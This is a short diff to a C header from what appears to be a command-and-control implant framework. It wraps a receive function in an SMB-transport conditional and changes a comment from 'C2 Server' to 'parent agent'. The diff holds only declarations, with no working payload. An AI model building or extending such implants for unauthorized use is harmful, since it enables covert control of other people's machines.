@@ -24,12 +24,14 @@ BOOL TransportInit( PPACKAGE Package );
  */
 BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );
 
+#ifdef TRANSPORT_SMB
 /*!
- * Receive data from our connected C2 Server
+ * Receive data from our connected parent agent.
  * @param Data Data buffer to save our data received from the server
  * @param Size Size of received data
  * @return Return if functions ran successful
  */
 PVOID TransportRecv( PSIZE_T Size );
+#endif
 
 #endif
